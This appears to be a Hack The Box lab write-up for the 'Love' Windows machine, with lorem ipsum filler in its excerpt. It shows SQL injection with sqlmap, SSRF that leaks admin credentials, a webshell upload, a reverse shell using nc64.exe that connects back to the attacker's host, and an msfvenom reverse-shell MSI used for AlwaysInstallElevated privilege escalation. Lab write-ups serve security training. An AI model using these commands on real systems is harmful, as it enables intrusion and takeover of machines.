---
layout: single
title: love - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-06
classes: wide
header:
  teaser: /assets/images/htb-writeup-love/love_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-love/love_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:~]# nmap -Pn -n -sCV --open 10.129.128.34
  PORT     STATE SERVICE      VERSION
  80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
  | http-cookie-flags:
  |   /:
  |     PHPSESSID:
  |_      httponly flag not set
  |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
  |_http-title: Voting System using PHP
  135/tcp  open  msrpc        Microsoft Windows RPC
  139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
  443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
  |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
  |_http-title: 403 Forbidden
  | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
  | Not valid before: 2021-01-18T14:00:16
  |_Not valid after:  2022-01-18T14:00:16
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |_  http/1.1
  445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
  3306/tcp open  mysql?
  | fingerprint-strings:
  |   ms-sql-s:
  |_    Host '10.10.14.51' is not allowed to connect to this MariaDB server
  5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
  |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
  |_http-title: 403 Forbidden
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  SF-Port3306-TCP:V=7.91%I=7%D=5/5%Time=60927F1A%P=x86_64-pc-linux-gnu%r(ms-
  SF:sql-s,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.51'\x20is\x20not\x20al
  SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
  Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  |_clock-skew: mean: 41m35s, deviation: 4h02m31s, median: -1h38m26s
  | smb-os-discovery:
  |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
  |   OS CPE: cpe:/o:microsoft:windows_10::-
  |   Computer name: Love
  |   NetBIOS computer name: LOVE\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2021-05-05T02:40:28-07:00
  | smb-security-mode:
  |   account_used: <blank>
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-security-mode:
  |   2.02:
  |_    Message signing enabled but not required
  | smb2-time:
  |   date: 2021-05-05T09:40:26
  |_  start_date: N/A


- SSL Cert CN: staging.love.htb
- MariaDB backend (MySQL)

DIRB:
  + http://love.htb/index.php (CODE:200|SIZE:4388)
  + http://love.htb/admin/index.php (CODE:200|SIZE:6198)
  ==> DIRECTORY: http://love.htb/plugins/
  ==> DIRECTORY: http://love.htb/images/
  ==> DIRECTORY: http://love.htb/dist/
  ==> DIRECTORY: http://love.htb/includes/
  ==> DIRECTORY: http://love.htb/admin/includes/
  + http://staging.love.htb/index.php (CODE:200|SIZE:5357)


NIKTO:
  -

2. Visiting http://love.htb we are presented with a login prompt, lets try to inject some code in it.

NOTE: THIS IS A BIG RABBIT HOLE!

Requst:
voter=1111'--&password=1111&login=

Response:
:  Trying to get property 'num_rows' of non-object in <b>C:\xampp\htdocs\omrs\login.php

We have SQL injection! Lets simplify it using SQLmap.

  [root:/git/htb/love]# cat req.txt                                                                                                 (master✱)
    POST /login.php HTTP/1.1
    Host: love.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 58
    Origin: http://love.htb
    Connection: close
    Referer: http://love.htb/index.php
    Cookie: PHPSESSID=0fg0p0lgce3kitltnvd8r2bvst
    Upgrade-Insecure-Requests: 1

    voter=*&password=1111&login=

  [root:/git/htb/love]# sqlmap -r req.txt --threads=10 --dbs
    ..
    available databases [6]:
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] phpmyadmin
    [*] test
    [*] votesystem

  [root:/git/htb/love]# sqlmap -r req.txt --threads=10 -D votesystem --tables
    Database: votesystem
    [5 tables]
    +------------+
    | admin      |
    | candidates |
    | positions  |
    | voters     |
    | votes      |
    +------------+

  [root:/git/htb/love]# sqlmap -r req.txt --threads=10 -D votesystem -T admin --columns
    Database: votesystem
    Table: admin
    [7 columns]
    +------------+--------------+
    | Column     | Type         |
    +------------+--------------+
    | created_on | date         |
    | firstname  | varchar(50)  |
    | id         | int(11)      |
    | lastname   | varchar(50)  |
    | password   | varchar(60)  |
    | photo      | varchar(150) |
    | username   | varchar(50)  |
    +------------+--------------+

  [root:/git/htb/love]# sqlmap -r req.txt --threads=10 -D votesystem -T admin -C username,password --dump
    [12:31:01] [INFO] retrieved: admin
    Database: votesystem
    Table: admin
    [1 entry]
    +----------+--------------------------------------------------------------+
    | username | password                                                     |
    +----------+--------------------------------------------------------------+
    | admin    | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |
    +----------+--------------------------------------------------------------+

Lets go for login credentials, targeting the voters table.
  [root:/git/htb/love]# sqlmap -r req.txt --threads=10 -D votesystem -T voters --columns
    Database: votesystem
    Table: voters
    [6 columns]
    +-----------+--------------+
    | Column    | Type         |
    +-----------+--------------+
    | firstname | varchar(30)  |
    | id        | int(11)      |
    | lastname  | varchar(30)  |
    | password  | varchar(60)  |
    | photo     | varchar(150) |
    | voters_id | varchar(15)  |
    +-----------+--------------+

  [root:/git/htb/love]# sqlmap -r req.txt --threads=10 -D votesystem -T voters -C voters_id,password --dump
    [12:49:47] [WARNING] table 'voters' in database 'votesystem' appears to be empty
    Database: votesystem
    Table: voters
    [0 entries]
    +-----------+----------+
    | voters_id | password |
    +-----------+----------+
    +-----------+----------+

Nothing to be found here.. trying the other tables result in the same, empty, output.
The admin hash we found earlier is a 'bcrypt $2*$, Blowfish (Unix)' (-m3200) hash, and unfortunately it's a pain to crack.


3. Instead, we shift focus to the vhost, staging.love.htb. Directly we find an interesting scanner function at
http://staging.love.htb/beta.php where we can enter urls to scan. Trying the usual reverse shells only prints them out,
so it feels more like it's just printing the file (like a cURL), rather then executing them in a sandbox environment.

So lets try to read internal files from the victim box.

Scan 'http://127.0.0.1/server-info' and we find all the interesting web info, among other - the overlooked web port 5000.
Scan 'http://127.0.0.1:5000' this time and we find creds!

  'Vote Admin Creds admin: @LoveIsInTheAir!!!! '


4. Login with admin:@LoveIsInTheAir!!!! on http://love.htb/admin/index.php and we find the admin's name - Neovic Devierte.
We cant do much once logged in, however we can upload a profile image. There don't seem to be any health checks on the uploaded
file, meaning we can upload whatever we want.

Upload a webshell, and from there trigger a reverse shell using smbserver.py and nc64.exe.

  a. Upload webshell.php and visit: http://love.htb/images/webshell.php
  b. Start smb in a dir containing nc64.exe:
      [root:/srv/pub-share]# smbserver.py share .
  c. Execute the reverse connection:
      //10.10.14.51/share/nc64.exe 10.10.14.51 4488 -e powershell

      [root:/git/htb/love]# rlwrap nc -lvnp 4488                                                                                        (master✱)
        listening on [any] 4488 ...
        connect to [10.10.14.51] from (UNKNOWN) [10.129.128.40] 64259
        Windows PowerShell
        Copyright (C) Microsoft Corporation. All rights reserved.

        Try the new cross-platform PowerShell https://aka.ms/pscore6

        PS C:\xampp\htdocs\omrs\images> whoami
          love\phoebe


4. Grab user.txt

  PS C:\Users\Phoebe\Desktop> type user.txt
    3f7eb90595f1bd4bfc90f71350954198

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Start by running winPEAS.bat, reading it thoroughly we see that 'AlwaysInstallElevated' is enabled.

  PS C:\Users> //10.10.14.51/share/winPEAS.bat
    ..
    _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AlwaysInstallElevated? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
    [i] If '1' then you can install a .msi file with admin privileges ;)
      [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated

    HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1

    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1


2. Create a reverse msi-payload, upload it to the victim and trigger to grab a SYSTEM session.

  [root:/git/htb/love]# msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4499 --format msi --out AlwaysInstallElevated.msi
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of msi file: 159744 bytes
    Saved as: AlwaysInstallElevated.msi


  C:\temp>copy \\10.10.14.51\share\AlwaysInstallElevated.msi .
  PS C:\temp> msiexec /quiet /qn /i AlwaysInstallElevated.msi

  [root:/git/htb/love]# nc -lvnp 4499                                                                                               (master✱)
    listening on [any] 4499 ...
    connect to [10.10.14.51] from (UNKNOWN) [10.129.128.40] 64323
    Microsoft Windows [Version 10.0.19042.928]
    (c) Microsoft Corporation. All rights reserved.

    C:\WINDOWS\system32> whoami
      nt authority\system

    C:\WINDOWS\system32> type C:\Users\Administrator\Desktop\root.txt
      a9ace27cdf26ccc8a607e4f296791c4c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


AlwaysInstallElevated:
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
